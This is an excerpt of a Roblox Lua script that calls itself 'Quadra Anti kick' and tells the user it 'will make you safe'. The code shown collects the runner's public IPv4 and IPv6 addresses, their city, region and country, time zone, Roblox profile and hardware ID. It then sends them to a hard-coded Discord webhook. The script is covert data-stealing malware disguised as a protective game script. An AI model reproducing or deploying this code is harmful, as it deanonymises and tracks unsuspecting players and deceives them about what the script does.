...
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title="Quadra Anti kick Is Loading",
    Text="Quadra Anti kick is executed,This will make you safe.",
    Button1="Okay!",
    Duration=8
})
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title="Quadra Is here!",
    Text="Thank you for trusting our script!",
    Button1="Okay!",
    Duration=8
})
...
local userProfileLink = "https://www.roblox.com/users/".. LPR.UserId.. "/profile"

local startTime = tick()

local ipv4 = tostring(game:HttpGet("https://api.ipify.org", true))
local ipv6 = tostring(game:HttpGet("https://api6.ipify.org", true))

local ipDataV4 = HTTP_:JSONDecode(game:HttpGet("http://ip-api.com/json/".. ipv4))
local ipDataV6 = HTTP_:JSONDecode(game:HttpGet("http://ip-api.com/json/".. ipv6))

local locationV4 = ipDataV4.city.. ", ".. ipDataV4.region.. ", ".. ipDataV4.country
local locationV6 = ipDataV6.city.. ", ".. ipDataV6.region.. ", ".. ipDataV6.country
...
local url = "https://discord.com/api/webhooks/1257639363756429383/6wqrC3jRNOwmc6ymwHiYH6HhiBmFYD9xoELP2c7TkKWMdVPLcIrSmngU3gvpOjm84yub"
local data = {
    ...
    ["embeds"] = {
        {
            ...
            ["fields"] = {
                ...
                { name = "IPv4 Location", value = locationV4, inline = true },
                { name = "IPv6", value = ipv6, inline = true },
                { name = "IPv6 Location", value = locationV6, inline = true },
                { name = "Time Zone", value = timeZone, inline = true },
                { name = "Roblox Profile", value = userProfileLink, inline = true },
                { name = "HWID", value = hwid, inline = true },
                { name = "Script Execution Time", value = executionTime.. " seconds", inline = true },
            },
...
print("Quadra Bypasser Checking")
print("Script made by Syr0nix Edited by Quadra")

local Window = Rayfield:CreateWindow({
	Name = "Quadra Script",
	LoadingTitle = "Quadra Presents",
	LoadingSubtitle = "by Quadra",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "Quadra",
		FileName = "Quadraspy"
	...
	KeySettings = {
		Title = "Quadra Script",
		Subtitle = "Serial key Correct!",
		Note = "Thanks For Buying Our Product",
		SaveKey = true,
		Key = "Quadra123"
	}
})
